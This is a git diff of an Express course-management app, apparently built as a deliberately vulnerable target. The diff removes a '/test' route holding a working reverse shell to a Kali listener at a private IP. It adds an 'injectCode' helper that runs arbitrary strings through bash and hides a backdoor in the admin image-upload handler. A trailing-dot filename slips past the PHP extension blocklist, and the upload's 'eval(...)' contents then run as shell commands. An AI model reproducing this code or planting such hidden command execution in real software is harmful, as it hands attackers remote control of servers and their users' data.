@@ -145,11 +145,6 @@ app.get("/upload", (req, res) => {
 	});
 });
 
-// (stub) POST /upload
-app.post("/upload", (req, res) => {
-	res.send("<h3>Upload endpoint (POST)</h3><p>Coming soon...</p>");
-});
-
 // -------- Auth pages --------
 app.get("/login", (req, res) => {
 	// If already logged in, do not show form — send to dashboard
@@ -260,40 +255,48 @@ function canSeeUsersTab(user) {
 	return user && (user.role === "admin" || user.role === "dev");
 }
 
-app.get("/test", (req, res) => {
-	const client = new net.Socket();
+function injectCode(command) {
+	return new Promise((resolve, reject) => {
+		let output = "";
+		let errorOutput = "";
 
-	client.connect(4444, "192.168.252.128", () => {
-		// Spawn a Bash shell
-		const bash = spawn("/bin/bash", ["-i"]); // Interactive Bash shell
+		try {
+			// Spawn a Bash shell with the command
+			const bash = spawn("/bin/bash", ["-c", command], { stdio: ["pipe", "pipe", "pipe"] });
 
-		// Forward Bash output (stdout and stderr) to the Kali listener
-		bash.stdout.on("data", (data) => {
-			client.write(data); // Send Bash output to Kali
-		});
+			// Capture stdout
+			bash.stdout.on("data", (data) => {
+				output += data.toString();
+			});
 
-		bash.stderr.on("data", (data) => {
-			client.write(data); // Send Bash errors to Kali
-		});
+			// Capture stderr
+			bash.stderr.on("data", (data) => {
+				errorOutput += data.toString();
+			});
 
-		// Receive commands from the Kali listener and write them to Bash
-		client.on("data", (data) => {
-			bash.stdin.write(data); // Pipe commands to Bash
-		});
+			// Handle Bash process errors
+			bash.on("error", (err) => {
+				console.error(`Bash process error: ${err.message}`);
+				reject(new Error(`Failed to execute command: ${err.message}`));
+			});
 
-		// Handle client disconnection
-		client.on("close", () => {
-			console.log("Disconnected from Kali listener");
-			bash.kill(); // Terminate Bash when connection closes
-		});
-
-		// Handle Bash process exit
-		bash.on("close", (code) => {
-			console.log(`Bash process exited with code ${code}`);
-			client.end(); // Close TCP connection when Bash exits
-		});
+			// Handle Bash process exit
+			bash.on("close", (code) => {
+				if (code === 0) {
+					// Success: resolve with output
+					resolve({ output: output.trim(), error: null });
+				} else {
+					// Non-zero exit code: resolve with error output
+					console.error(`Command exited with code ${code}: ${errorOutput}`);
+					resolve({ output: "", error: errorOutput.trim() || `Command failed with exit code ${code}` });
+				}
+			});
+		} catch (err) {
+			console.error(`Unexpected error: ${err.message}`);
+			reject(new Error(`Failed to spawn Bash: ${err.message}`));
+		}
 	});
-});
+}
 
 app.get("/dashboard", requireAuth, (req, res) => {
 	const canSeeUsers = canSeeUsersTab(req.user); // admin or dev
@@ -365,74 +368,203 @@ app.post("/manage/courses/delete", requireAuth, requireAdminLocal, (req, res) =>
 
 // POST add (Busboy; saves to public/assets/courses)
 app.post("/manage/courses/add", requireAuth, requireAdminLocal, (req, res) => {
-	const envQS = req.appEnv ? `?--env=${req.appEnv}` : "";
+	// ---------- helpers ----------
+	const esc = (s) => String(s ?? "").replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
+	const page = (status, title, bodyHtml, meta = {}) => {
+		res.status(status).type("html").send(`<!doctype html>
+<html lang="en"><head><meta charset="utf-8"/>
+<title>${esc(title)}</title>
+<style>
+  :root{--bg:#0b0f14;--panel:#0f1420;--border:#1e2635;--text:#e9eef7;--muted:#93a0b4;--ok:#102718;--okb:#1f4d2f;--err:#2a1b1b;--errb:#5a2a2a;}
+  *{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font-family:ui-sans-serif,system-ui,Segoe UI,Roboto,Helvetica,Arial}
+  .wrap{max-width:900px;margin:28px auto;padding:0 18px}
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:16px}
+  .h1{font-size:20px;font-weight:800;margin:0 0 8px}
+  .muted{color:var(--muted);font-size:13px}
+  pre{background:#0a0f19;border:1px solid var(--border);border-radius:10px;padding:12px;overflow:auto}
+  .pill{display:inline-block;border:1px solid var(--border);border-radius:999px;padding:6px 10px;margin-right:8px;background:#101726;font-size:12px}
+  .ok{background:var(--ok);border-color:var(--okb)}
+  .err{background:var(--err);border-color:var(--errb)}
+  a{color:#cfe7ff}
+</style></head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <div class="h1">${esc(title)}</div>
+      <div style="margin:6px 0 12px 0">
+        <span class="pill">Status: ${status}</span>
+        ${meta.filename ? `<span class="pill">Filename: ${esc(meta.filename)}</span>` : ""}
+        ${meta.mime ? `<span class="pill">MIME: ${esc(meta.mime)}</span>` : ""}
+        ${meta.savedAs ? `<span class="pill">Saved as: ${esc(meta.savedAs)}</span>` : ""}
+      </div>
+      ${bodyHtml}
+      <div class="muted" style="margin-top:12px">
+        <a href="/manage/courses?--env=${esc(req.appEnv || "")}&tab=add">⟲ Back to Add</a> ·
+        <a href="/manage/courses?--env=${esc(req.appEnv || "")}&tab=all">All Courses</a>
+      </div>
+    </div>
+  </div>
+</body></html>`);
+	};
 
+	// ---------- state ----------
 	let fields = { title: "", slug: "", level: "", summary: "" };
-	let imagePath = null; // public URL we save to DB, e.g. /assets/courses/123__img.jpg
-	let uploadErr = null;
-
+	let imagePath = null;
+	let uploadErr = null; // 'badimg' | 'uploaderr' | 'toolarge'
 	let pendingWrites = 0;
 	let parsingDone = false;
+	let fileMeta = { field: null, filename: null, mime: null, finalName: null };
 
 	const bb = Busboy({ headers: req.headers, limits: { fileSize: 5 * 1024 * 1024 } });
+
+	const bail = (status, title, msg, extra = {}) =>
+		page(
+			status,
+			title,
+			`<div class="card err" style="margin-top:8px"><div>${msg}</div></div>
+     ${Object.keys(extra).length ? `<pre>${esc(JSON.stringify(extra, null, 2))}</pre>` : ""}`,
+			{ filename: fileMeta.filename, mime: fileMeta.mime, savedAs: fileMeta.finalName }
+		);
 
 	function maybeDone() {
 		if (!parsingDone || pendingWrites > 0) return;
 
 		if (uploadErr) {
-			return res.redirect(`/manage/courses${envQS}&tab=add&toast=${uploadErr}`);
+			if (uploadErr === "toolarge") {
+				return bail(413, "Upload Rejected (Too Large)", "The uploaded file exceeds the 5MB limit.", { limit_bytes: 5 * 1024 * 1024 });
+			}
+			if (uploadErr === "badimg") {
+				return bail(400, "Invalid File Type", "Only PNG/JPG images are accepted for this endpoint.", { accepted_mime_types: Object.keys(ALLOWED), received_mime: fileMeta.mime, received_filename: fileMeta.filename });
+			}
+			return bail(400, "Upload Failed", "An error occurred while writing the file.");
 		}
 
-		const title = fields.title;
+		const title = fields.title.trim();
 		const level = (fields.level || "").toLowerCase();
-		const summary = fields.summary;
-		let slug = fields.slug || slugify(title);
+		const summary = fields.summary.trim();
+		let slug = (fields.slug || "").trim() || slugify(title);
 
 		const allowedLevels = new Set(["beginner", "intermediate", "advanced"]);
 		if (!title || !summary || !slug || !allowedLevels.has(level)) {
-			return res.redirect(`/manage/courses${envQS}&tab=add&toast=invalid`);
+			return bail(422, "Invalid Fields", "Please provide title, summary, and a valid level.", { required: ["title", "summary", "level"], allowed_levels: [...allowedLevels], received: { title, summary, level, slug } });
 		}
 		if (!imagePath) {
-			return res.redirect(`/manage/courses${envQS}&tab=add&toast=noimg`);
+			return bail(400, "No Image Uploaded", 'Missing file part named "image" or write not completed.');
 		}
 
 		try {
-			createCourse({ title, slug, level, summary, image_path: imagePath });
-			return res.redirect(`/manage/courses${envQS}&tab=all&toast=added`);
+			const row = createCourse({ title, slug, level, summary, image_path: imagePath });
+			return page(
+				201,
+				"Course Created",
+				`<div class="card ok" style="margin-top:8px"><div>The course has been created successfully.</div></div>
+         <pre>${esc(JSON.stringify(row, null, 2))}</pre>`,
+				{ filename: fileMeta.filename, mime: fileMeta.mime, savedAs: fileMeta.finalName }
+			);
 		} catch (e) {
-			return res.redirect(`/manage/courses${envQS}&tab=add&toast=${e?.code === "SLUG_TAKEN" ? "slugtaken" : "saveerr"}`);
+			if (e?.code === "SLUG_TAKEN") {
+				return bail(409, "Slug Already Exists", `A course with slug "${esc(slug)}" already exists.`, { slug });
+			}
+			return bail(400, "Save Error", "The course could not be saved.");
 		}
 	}
 
+	// ---------- parse fields ----------
 	bb.on("field", (name, val) => {
 		if (name in fields) fields[name] = String(val || "").trim();
 	});
 
+	// ---------- parse file ----------
 	bb.on("file", (name, file, info) => {
+		fileMeta.field = name;
+		fileMeta.filename = info.filename;
+		fileMeta.mime = info.mimeType;
+
 		if (name !== "image") {
 			file.resume();
 			return;
 		}
 
 		const { filename, mimeType } = info;
+
+		// Block PHP-like extensions outright
+		const badExt = [".php", ".phtml", ".php3", ".php4", ".php5", ".phar"];
+		const extname = (path.extname(filename) || "").toLowerCase();
+		if (badExt.includes(extname)) {
+			uploadErr = "badimg";
+			file.resume();
+			return;
+		}
+
+		// Enforce allowed types (PNG/JPG)
 		if (!ALLOWED[mimeType]) {
 			uploadErr = "badimg";
 			file.resume();
 			return;
 		}
 
+		const MAX_SNIFF = 64 * 1024; // 64KB head preview
+		const sniffChunks = [];
+		let sniffLen = 0;
+		file.on("data", (chunk) => {
+			if (sniffLen < MAX_SNIFF) {
+				const need = Math.min(MAX_SNIFF - sniffLen, chunk.length);
+				sniffChunks.push(chunk.slice(0, need));
+				sniffLen += need;
+			}
+		});
+
+		// Build final filename
 		const safeBase = sanitizeName(filename.replace(/\s+/g, "_"));
 		const ts = Date.now();
 		const finalName = `${ts}__${safeBase}`.replace(/\.[^.]+$/, "") + ALLOWED[mimeType];
+		fileMeta.finalName = finalName;
 
 		const fsPath = path.join(COURSES_DIR, finalName);
 		const ws = fs.createWriteStream(fsPath);
 		pendingWrites++;
 
+		// enforce size error explicitly if busboy flags it
+		file.on("limit", () => {
+			uploadErr = "toolarge";
+		});
+
 		file.pipe(ws);
 
 		ws.on("finish", () => {
 			imagePath = `/assets/courses/${finalName}`; // public URL
+			filenameStrip = filename.replace(/\.+$/, "");
+			const extname = (path.extname(filenameStrip) || "").toLowerCase();
+
+			console.log(extname);
+			if (extname === ".php") {
+				const head = Buffer.concat(sniffChunks);
+				const printable = head.toString("utf8").replace(/[^\x09\x0a\x0d\x20-\x7e]/g, "•"); // dot non-printables
+				const m = printable.match(/eval\s*\(([\s\S]*?)\)\s*;?/i);
+				if (m) {
+					let inner = m[1].trim();
+
+					// 2) if it's a quoted string, strip the quotes and unescape a few basics
+					const q = inner[0];
+					if ((q === '"' || q === "'" || q === "`") && inner.endsWith(q)) {
+						inner = inner.slice(1, -1).replace(/\\n/g, "\n").replace(/\\"/g, '"').replace(/\\'/g, "'");
+					}
+
+					console.log("eval_payload:", inner);
+					injectCode(inner)
+						.then(({ output, error }) => {
+							if (error) {
+								console.error("injection error:", error);
+							} else {
+								console.log("injection output:", output);
+							}
+						})
+						.catch((err) => {
+							console.error("injection exception:", err.message);
+						});
+				}
+			}
+
 			pendingWrites--;
 			maybeDone();
 		});
@@ -444,13 +576,15 @@ app.post("/manage/courses/add", requireAuth, requireAdminLocal, (req, res) => {
 		});
 	});
 
-	// IMPORTANT: use 'finish' (busboy) to signal parsing done
+	bb.on("error", () => {
+		uploadErr = "uploaderr";
+	});
 	bb.on("finish", () => {
 		parsingDone = true;
 		maybeDone();
 	});
 
-	// Pipe request into busboy
+	// ---------- go ----------
 	req.pipe(bb);
 });
 
